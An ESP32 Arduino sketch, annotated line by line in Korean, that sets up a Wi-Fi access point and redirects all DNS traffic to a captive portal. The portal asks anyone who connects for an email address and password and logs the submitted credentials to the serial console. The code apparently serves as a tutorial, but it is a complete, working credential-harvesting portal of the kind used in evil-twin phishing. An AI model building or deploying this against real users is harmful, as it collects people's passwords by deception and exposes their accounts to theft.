#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

const char *ssid = "ESP32_Captive_Portal"; // 네트워크 이름(SSID)
const char *password = "12345678"; // 네트워크 비밀번호

DNSServer dnsServer;
WebServer webServer(80);

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);

//웹 페이지를 생성하여 클라이언트가 이메일 주소와 비밀번호를 입력 할 수 있는 폼을 제공한다.
void handleRoot() {
  Serial.println("Serving root page"); //메시지 출력
  String page = "<h1>Welcome to the Captive Portal</h1>"; //string 객체인 page를 생성하고, 해당 문자열에 해당 메시지를 할당한다. 큰 제목을 가진 환영 메시지가 출력된다.
  page += "<form action='/submit' method='POST'>"; //page 문자열에 HTML 폼을 추가합니다. 이 폼은 /submit 경로로 데이터를 보내고, POST 메서드를 사용하여 데이터를 전송합니다.
  page += "<label>Email:</label><br>"; //page 문자열에 이메일 입력 필드를 추가합니다. <label> 태그는 입력 필드의 설명을 나타내고, <br> 태그는 줄 바꿈을 의미합니다.
  page += "<input type='text' name='email'><br>"; //page 문자열에 실제 이메일을 입력할 수 있는 텍스트 입력 필드를 추가합니다. name 속성은 폼 데이터의 키(key)를 나타냅니다.
  page += "<label>Password:</label><br>"; //page 문자열에 비밀번호 입력 필드의 설명을 추가합니다.
  page += "<input type='password' name='password'><br>"; //page 문자열에 비밀번호를 입력할 수 있는 비밀번호 입력 필드를 추가합니다. 이 필드의 내용은 마스킹되어 보여지지 않습니다.
  page += "<input type='submit' value='Submit'>"; //page 문자열에 제출 버튼을 추가합니다. 이 버튼을 누르면 폼에 입력된 데이터가 /submit 경로로 전송됩니다.
  page += "</form>"; //page 문자열에 폼을 닫는 태그를 추가합니다.
  webServer.send(200, "text/html", page); //200은 http 상태 코드로 클라이언트의 요청이 성공적으로 처리되었음을 알리며 성공시 뒤에 있는 html 형식으로 작성된 문자열이 사이트에 출력된다.
//성공적으로 처리되었다면 send() 메서드를 사용하여 HTTP 응답을 보냅니다.
}

void handleSubmit() {
  Serial.println("Form submitted"); //메시지 출력
  if (webServer.hasArg("email") && webServer.hasArg("password")) { //폼에서 전송된 데이터 중에 email"과 "password"라는 이름의 매개변수가 있는지 hasArg() 함수로 확인합니다. 
    String email = webServer.arg("email"); //확인된 이메일 주소를 가져와서 email 변수에 할당한다.
    String password = webServer.arg("password"); //확인된 비밀번호를 가져와서 password 변수에 할당한다.

    // 입력된 이메일 주소와 비밀번호를 시리얼 모니터에 출력
    Serial.print("Email: ");
    Serial.println(email);
    Serial.print("Password: ");
    Serial.println(password);

    // 와이파이 설정 허가 메시지를 클라이언트에게 보냄
    webServer.send(200, "text/html", "<h1>Wi-Fi settings submitted successfully!</h1>");
  } else {
    // 이메일 또는 비밀번호가 전송되지 않은 경우
    webServer.send(400, "text/html", "<h1>Bad request. Email and password are required.</h1>");
  }
}

void handleNotFound() {
  // 클라이언트가 어떤 URL을 입력하더라도 캡티브 포털 페이지로 리다이렉트
  Serial.println("Redirecting to captive portal");
  webServer.sendHeader("Location", "/", true);
  webServer.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);

  // Access Point 설정
  WiFi.softAP(ssid, password);
  if (WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0))) {
    Serial.println("AP Config Success");
  } else {
    Serial.println("AP Config Failed");
  }

  // DNS 서버 시작
  if (dnsServer.start(DNS_PORT, "*", apIP)) {
    Serial.println("DNS Server Started");
  } else {
    Serial.println("DNS Server Failed");
  }

  // 웹 서버 라우트 설정
  webServer.on("/", handleRoot);
  webServer.on("/submit", HTTP_POST, handleSubmit); //이 코드는 클라이언트가 폼에서 데이터를 입력하고 제출하면 해당 데이터를 서버로 전송하고, 서버는 이를 처리하기 위해 handleSubmit() 함수를 호출합니다.
  webServer.onNotFound(handleNotFound);
  webServer.begin();

  Serial.println("Captive Portal Started");
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());
}

void loop() {
  dnsServer.processNextRequest(); //dns 서버가 들어오는 요청을 처리한다.
  webServer.handleClient(); //웹 서버가 들어오는 클라이언트 요청을 처리한다.
}

